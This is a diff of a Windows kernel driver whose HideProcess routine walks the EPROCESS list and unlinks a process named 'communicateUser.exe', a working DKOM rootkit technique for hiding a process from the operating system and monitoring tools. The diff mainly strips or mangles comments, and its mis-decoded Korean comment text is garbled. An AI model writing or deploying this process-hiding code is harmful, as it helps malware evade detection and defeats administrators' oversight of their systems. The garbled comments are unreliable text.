@@ -9,9 +9,8 @@ static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;
 extern "C"
 BOOLEAN InitializeOffsets()
 {
-	// ºÒÅõ¸í ±¸Á¶Ã¼ EPROCESS ¸â¹ö º¯¼ö À§Ä¡ °è»ê
-	nameOffset = CalcProcessNameOffset();			// ÇÁ·Î¼¼½º ÀÌ¹ÌÁö ÀÌ¸§
-	pidOffset = CalcPIDOffset();					// PID
+	nameOffset = CalcProcessNameOffset();
+	pidOffset = CalcPIDOffset();
 	listEntryOffset = pidOffset + sizeof(HANDLE);	// LIST_ENTRY
 
 	if (pidOffset == 0 || nameOffset == 0)
@@ -34,32 +33,30 @@ VOID HideProcess()
 	const char target[] = "communicateUser.exe";
 	ANSI_STRING targetProcessName, currentProcessName;
 
-	// ÇöÀç ÇÁ·Î¼¼½º¸¦ EPROCESS Ã¹ ³ëµå·Î ¼³Á¤ÇÑ´Ù.
 	eprocessStart = IoGetCurrentProcess();
 	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
 	RtlInitAnsiString(&targetProcessName, target);
 
 	do
 	{
-		// LIST_ENTRY·ÎºÎÅÍ EPROCESS ±¸Á¶Ã¼ È¹µæ
 		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
 		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));
 
-		//Target ProcessÀÎÁö È®ÀÎ
+		//Target Processì¸ì§€ í™•ì¸
 		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
 		{
 			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);
 
-			// TargetProcessÀÇ ÀÌÀü ³ëµåÀÇ ´ÙÀ½ ¸µÅ©¸¦ TargetProcessÀÇ ´ÙÀ½ ¸µÅ©·Î ¼³Á¤ÇÑ´Ù.
+			// TargetProcess
 			// (A->B->C->) to (A->C)
 			prevNode = currentNode->Blink;
 			prevNode->Flink = currentNode->Flink;
 
-			// TargetProcessÀÇ ´ÙÀ½ ³ëµåÀÇ ÀÌÀü ¸µÅ©¸¦ TargetProcessÀÇ ÀÌÀü ¸µÅ©·Î ¼³Á¤ÇÑ´Ù.
+			// TargetProcess
 			// (A<-B<-C<-) to (A<-C)
 			currentNode->Flink->Blink = prevNode;
 
-			// TargetProcessÀÇ ¸µÅ©¸¦ ÀÚ½ÅÀ¸·Î º¯°æ
+			// TargetProcessì˜ ë§í¬ë¥¼ ìì‹ ìœ¼ë¡œ ë³€ê²½
 			currentNode->Flink = currentNode;
 			currentNode->Blink = currentNode;
 			break;
@@ -67,5 +64,5 @@ VOID HideProcess()
 
 		currentNode = currentNode->Flink;
 	} while (currentNode->Flink != head);
-	// EPROCESS´Â ¾ç¹æÇâ ¿¬°á¸®½ºÆ®·Î ¿¬°áµÇ±â ¶§¹®¿¡ ÇÑ¹ø ¼øÈ¸ÇÏ¸é Á¦ÀÚ¸®·Î µ¹¾Æ¿Â´Ù.
+	// EPROCESS
 }
